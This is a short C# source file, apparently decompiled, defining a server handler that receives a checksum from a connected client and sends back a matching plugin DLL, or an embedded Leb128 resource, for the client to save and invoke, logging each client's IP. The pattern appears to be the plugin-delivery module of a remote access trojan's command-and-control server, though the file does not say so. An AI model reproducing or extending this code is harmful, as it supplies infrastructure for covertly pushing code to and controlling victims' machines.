using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Helper;
using Server.Properties;

namespace Server.Messages;

internal class HandlerGetDLL
{
	public static void Read(Clients client, object[] objects)
	{
		client.lastPing.Disconnect();
		string text = (string)objects[1];
		if (text == "leb")
		{
			client.Send(new object[3]
			{
				"SaveInvoke",
				text,
				Resources.Leb128
			});
			return;
		}
		string[] files = Directory.GetFiles("Plugin", "*.dll", SearchOption.TopDirectoryOnly);
		foreach (string text2 in files)
		{
			if (text == Methods.GetChecksum(text2))
			{
				Methods.AppendLogs(client.IP, "Send plugin: " + text2, Color.Aqua);
				client.Send(new object[3]
				{
					"SaveInvoke",
					text,
					File.ReadAllBytes(text2)
				});
				break;
			}
		}
	}
}
